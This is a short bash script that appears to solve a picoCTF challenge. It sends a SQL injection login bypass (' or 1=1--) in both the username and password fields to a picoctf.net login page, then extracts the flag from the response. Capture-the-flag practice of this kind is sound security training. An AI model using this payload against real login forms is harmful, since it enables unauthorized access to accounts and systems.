#!/bin/bash

read -p "Please input the port : " port
curl -X POST "http://saturn.picoctf.net:${port}/login.php" -d "username=' or 1=1--" -d "password=' or 1=1--" 2>&1| grep -o "picoCTF{.*}"
